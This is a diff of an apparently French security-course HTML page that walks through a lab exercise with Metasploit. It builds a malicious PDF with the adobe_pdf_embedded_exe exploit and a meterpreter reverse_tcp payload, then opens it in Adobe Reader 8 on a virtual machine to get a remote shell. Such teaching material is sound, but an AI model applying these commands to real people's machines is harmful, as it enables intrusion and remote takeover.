@@ -70,6 +70,7 @@
 </ul>
 </li>
 <li class="toctree-l1"><a class="reference internal" href="../virusencoders/virusencoders.html">2. Virus Encoders</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../MITM/mitm.html">3. Man In The Middle</a></li>
 </ul>
 
         </div>
@@ -135,13 +136,13 @@ Il faudra ensuite taper la commande exploit pour que la machine se mette sur éc
 Tapez la commande <code class="docutils literal notranslate"><span class="pre">msfconsole</span></code> pour démarrer métasploit.
 Ensuite il faut chercher le payload.
 Tapez <code class="docutils literal notranslate"><span class="pre">search</span> <span class="pre">windows</span> <span class="pre">fileformat</span> <span class="pre">pdf</span></code>. Vous aurez un résultat comme ci dessous :</p>
-<p><img alt="image search" src="reverse-shell/images/search_msfconsole.png" /></p>
+<p><img alt="image search" src="../_images/search_msfconsole.png" /></p>
 <p>Plusieurs modules répondent à notre recherche, mais peu d’entre eux sont classés comme excellents. Nous allons donc prendre le numéro 6.
 Pour l’utiliser tapez <code class="docutils literal notranslate"><span class="pre">use</span> <span class="pre">exploit/windows/fileformat/adobe_pdf_embedded_exe</span></code>
 Nous allons vouloir configurer un payload qui nous fera une connexion vers notre machine et qui ouvrira une session meterpreter.
 Ainsi, tapons la commande : <code class="docutils literal notranslate"><span class="pre">set</span> <span class="pre">payload</span> <span class="pre">windows/meterpreter/reverse_tcp</span></code></p>
 <p>Pour voir les options actuelles du payload, tapez : <code class="docutils literal notranslate"><span class="pre">show</span> <span class="pre">options</span></code>
-<img alt="image options" src="reverse-shell/images/show_options.png" /></p>
+<img alt="image options" src="../_images/show_options.png" /></p>
 <p>Vous devriez avoir quelque chose comme cela, peut être qu’une adresse par défaut ou qu’un port par défaut à été renseigné pour LHOST et LPORT.
 Nous allons configurer ce payload. Il faut commencer par renseigner les valeurs de LHOST et LPORT.
 Pour cela tapez <code class="docutils literal notranslate"><span class="pre">set</span> <span class="pre">LHOST</span> <span class="pre">x.x.x.x</span></code> en remplaçant les x par les valeurs de l’adresse ip de votre machine. Puis tapez <code class="docutils literal notranslate"><span class="pre">set</span> <span class="pre">LPORT</span> <span class="pre">xxx</span></code> en remplaçant xxx par le port de votre choix (par exemple, <code class="docutils literal notranslate"><span class="pre">set</span> <span class="pre">LPORT</span> <span class="pre">4444</span></code>).
@@ -163,12 +164,12 @@ De même que précédemment, il vous faut renseigner LHOST et LPORT. Quand cela 
 <h3><span class="section-number">1.2.4. </span>ÉTAPE 4 : Ouvrir le fichier<a class="headerlink" href="#etape-4-ouvrir-le-fichier" title="Lien permanent vers cette rubrique"></a></h3>
 <p>Le fichier est bien téléchargé sur la machine virtuelle.
 Avant de l’ouvrir, vérifiez bien que le listener est lancé. Vous devez voir cela :</p>
-<p><img alt="image listener" src="reverse-shell/images/listener.png" /></p>
+<p><img alt="image listener" src="../_images/listener.png" /></p>
 <p>avec votre adresse et votre port que vous avez renseigné.</p>
 <p>Si tout est prêt, ouvrez le pdf avec adobe reader 8 !</p>
-<p><img alt="image enregistrer" src="reverse-shell/images/enregistrer-template.png" /></p>
+<p><img alt="image enregistrer" src="../_images/enregistrer-template.png" /></p>
 <p>Enregistrez template.pdf s’il vous le demande.</p>
-<p><img alt="image open" src="reverse-shell/images/openpdf.png" /></p>
+<p><img alt="image open" src="../_images/openpdf.png" /></p>
 <p>Cliquez sur open.</p>
 <p>Retournez voir votre listener… Une fenêtre meterpreter s’est lancée, une connexion a été faite entre votre machine et celle de la victime. Tapez <code class="docutils literal notranslate"><span class="pre">help</span></code> pour voir tout ce qu’il vous est possible de faire. Amusez-vous bien ! Félicitations !</p>
 </section>
